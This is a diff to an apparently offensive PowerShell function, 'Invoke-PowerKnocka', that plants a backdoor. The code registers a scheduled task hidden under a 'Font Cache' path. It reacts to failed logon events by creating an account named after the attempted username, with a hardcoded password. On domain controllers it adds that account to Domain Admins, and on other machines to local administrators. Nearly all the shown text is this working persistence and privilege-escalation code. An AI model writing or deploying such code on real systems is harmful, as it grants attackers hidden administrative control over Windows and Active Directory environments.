@@ -15,13 +15,24 @@ function Invoke-PowerKnocka {
         [string]$TaskPath = "\Font Cache\",
 
         [Parameter(Mandatory=$false)]
-        [string]$Password = "Password1!qazwsx"
+        [string]$Password = "Password1!qazwsx",
+
+        [Parameter(Mandatory)]
+        [bool]$DC
     )
 
-    $ExploitString = "Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
+    if ($DC) {
+        $ExploitString = "Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
                     $n = $e.ReplacementStrings[5] `
-                    New-ADUser -Enabled $true -SamAccountName $n -name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force) `
+                    New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force) `
                     Add-ADGroupMember -Identity 'Domain Admins' -Members $n"
+    }
+    else {
+        $ExploitString = "Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
+                    $n = $e.ReplacementStrings[5] `
+                    net user $n $Password `
+                    net localgroup administrators $n /add"
+    }
 
     if ($Method -eq "Task") {
         $Class = Get-cimclass MSFT_TaskEventTrigger root/Microsoft/Windows/TaskScheduler
